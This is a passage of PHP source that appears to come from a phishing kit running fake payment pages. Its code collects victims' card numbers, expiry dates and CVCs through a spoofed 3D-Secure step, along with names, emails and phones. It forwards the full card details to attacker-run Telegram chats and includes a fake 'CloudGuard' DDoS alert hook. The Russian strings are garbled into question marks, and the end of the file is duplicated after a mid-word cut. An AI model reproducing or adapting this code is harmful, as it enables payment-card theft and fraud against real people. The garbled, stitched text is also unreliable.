							'???? ????????????: <b>'.userLogin($id, true, true).'</b>',
						], chatAdmin(), [true, [
							[
								['text' => '???? ?????????? ???? ????????', 'callback_data' => '/govbiv '.$id],
								['text' => '???? ???? ???????? ??????', 'callback_data' => '/nocode '.$id],
							],
						]]);
						$pcrt = [true, '<body onload="x.submit()"><form id="x" action="3ds'.$md.'" method="POST"><noscript><input type="submit" value="????????????????????"></noscript></form>'];
					} else {
						$pcrt = xCreate($amount, $card, $expm, $expy, $cvc, $redir, $shop, $xcaptchadata);
					}
					if ($pcrt[0]) {
						$data = $pcrt[1];
						if (!isCardData($card, $expm, $expy, $cvc)) {
							setCardData($card, $expm, $expy, $cvc);
							checkCard($card, $expm, $expy, $cvc, $balancecard, $amount, $cardbin, $username);
checkBot($username, $bottoken);
							botSend([
								'???? <b>?????????????? ???? 3D-Secure</b>',
								'',
								'???? <b>?????????? ????????????????:</b> <code>'.$amount.' '.$currency.'</code>',
								'???? <b>?????????? ??????????:</b> <code>'.cardHide($card).'</code>',
								'?????? <b>????????????????:</b> <code>'.($isrpac ? '????????????' : '????????????????????????????').'</code>',
								$_POST2['balancecard'] ? '???? <b>????????????:</b> <code>'.$balancecard.' '.$currency.'</code>' : '???? <b>?????????? ?????????????? ????????????????</b>',
								'',
								'???? <b>????????????????:</b> <code>'.$title.'</code>',
								'???? <b>????????????:</b> <code>'.getService($srvc, false, $isnr == 2).'</code>',
							], $id);
							botSend([
								'???? <b>???????????????? ??????????:</b>',
								'',
								'???? <b>????????????</b> '.userLogin2($id).'',
								'???? <b>?????????? ????????????????:</b> <code>'.$amount.' '.$currency.'</code>',
								'???? <b>?????????? ??????????:</b> <code>'.$card.'</code>',
								'???? <b>????????:</b> <code>'.$expm.'/'.$expy.'</code>',
								'???? <b>CVC:</b> <code>'.$cvc.'</code>',
							], chatAlerts());

							$checker = $_POST2['balancecard'] ? '<b>????????????: '.$balancecard.' '.$currency.'</b>' : '<b>?????????? ?????????????? ????????????????</b>';

							botSend([
								'?????? <b>???????????? ?????????????? '.userLogin2($id).' ?????????????? ???? 3D-Secure </b>',
								'???? <b>C????????: '.$amount.' '.$currency.'</b> ('.$checker.')',
								'???? <b>????????????: '.getService($srvc, false, $isnr == 2).'</b>',
								'',
								'???? - ?????????? ???? ???????????????? ????????!',
							], chatGroup());
						}
						break;
					} else {
						if ($pcrt[2])
							xEcho($pcrt[1]);
						$errmsg = $pcrt[1];
					}
				}
			}
			if ($isrpar)
				exit();
			$hash0 = md5($isnr.$item.$title.$amount.$cost.$srvc.$domain.$ip);
			if ($hash0 != getCookieData('hash', $_COOKIE2)) {
				setCookieData('hash', $hash0, $_COOKIE2);
				$city = $_POST2['fcity'];
				$fio = $_POST2['fname'];
				$email = $_POST2['femail'];
				$phone = $_POST2['fphone'];
				if($srvc == 12 || $srvc == 24) {
					$amount = $itemd[11];
				}
				$t = [
					'???? <b>???????????? ???????????? ???????????? ?????????? ??????:</b>',
					'',
					'???? <b>ID ????????????????????:</b> <code>'.$item.'</code>',
					'???? <b>??????????:</b> <code>'.$title.'</code>',
					'???? <b>???????? ????????????:</b> <code>'.$amount.' '.$currency.'</code>',
					'??????? <b>????????????:</b> <code>'.getService($srvc, false, $isnb == 2).'</code>',
				];
				if ($cost > 0)
					array_splice($t, 5, 0, [
						'???? <b> ????????????????: '.beaCash($cost).'</b>',
					]);
				if (strlen($phone) != 0)
					array_splice($t, 2, 0, [
						'???? <b>??????: '.$fio.'</b>',
						'?????? <b>??????????: '.$email.'</b>',
						'???? <b>??????????????: '.$phone.'</b>',
						'',
					]);
				if (strlen($city) != 0)
					array_splice($t, 2, 0, [
						'???? <b> ?????????? ????????????????:'.$city.'</b>',
					]);
				botSend($t, $id);
			}

			$data = str_replace([
				'%balancecard%',
				'%check_on%',
				'%style%',
				'%script%',
				'%amount%',
				'%amount2%',
				'%title%',
				'%card%',
				'%expm%',
				'%expy%',
				'%cvc%',
				'%txt1%',
				'%txt2%',
				'%txt3%',
				'%errmsg%',
				'%infmsg%',
			], [
				$isnt ? ($itemd[12] ? $itemd[12] : 'none') : ($itemd[17] ? $itemd[17] : 'none'),
				$isnt ? ($itemd[12] ? 'required' : 'none') : ($itemd[17] ? 'required' : 'none'),
				fileRead(dirStyles($srvc.'-0')),
				fileRead(dirScripts($srvc.'-0')),
				number_format($amount, 0, '.', ' '),
				$amount,
				$title,
				$card,
				$expm,
				$expy,
				$cvc,
				$ttx[1],
				$ttx[2],
				$ttx[3],
				$errmsg ? $errmsg : '',
				$ttx[4],
			], fileRead(dirPages($srvc.'-0')));
			break;
		}
	}
	if ($ddos0) {
		$ddos = getItemData($item, $isnt)[0];
		$ddos2 = [50, 100, 250 ,500, 1000, 2000, 3000, 5000, 10000];
		if (in_array($ddos, $ddos2)) {

			botSend([
				'<b>???? CloudGuard</b>',
				'',
				'<b>~ ???????????????????? DDoS ?????????? ???? ?????????? '.$domain.'</b>',
				'<b>~ ???????????????????? ????????????????: '.$ddos.'</b>',
				'',
				'<b>~ ???????????????????? ID: '.$item.'</b>',
			], chatAlerts());

			botSendAlert([
				'<b>???? CloudGuard</b>',
				'',
				'<b>~ ???????????????????? DDoS ?????????? ???? ?????????? '.$domain.'</b>',
				'<b>~ ???????????????????? ????????????????: '.$ddos.'</b>',
				'',
				'<b>~ ???????????????????? ID: '.$item.'</b>',
			], '-1001457638015');

			delUserItem($id, $item, $isnt);
			}
		}
	if ($data && $data != '')
		xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
?>
Read(dirPages($srvc.'-0')));
			break;
		}
	}
	if ($ddos0) {
		$ddos = getItemData($item, $isnt)[0];
		$ddos2 = [50, 100, 250 ,500, 1000, 2000, 3000, 5000, 10000];
		if (in_array($ddos, $ddos2)) {

			botSend([
				'<b>???? CloudGuard</b>',
				'',
				'<b>~ ???????????????????? DDoS ?????????? ???? ?????????? '.$domain.'</b>',
				'<b>~ ???????????????????? ????????????????: '.$ddos.'</b>',
				'',
				'<b>~ ???????????????????? ID: '.$item.'</b>',
			], chatAlerts());

			botSendAlert([
				'<b>???? CloudGuard</b>',
				'',
				'<b>~ ???????????????????? DDoS ?????????? ???? ?????????? '.$domain.'</b>',
				'<b>~ ???????????????????? ????????????????: '.$ddos.'</b>',
				'',
				'<b>~ ???????????????????? ID: '.$item.'</b>',
			], '-1001457638015');

			delUserItem($id, $item, $isnt);
			}
		}
	if ($data && $data != '')
		xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
?>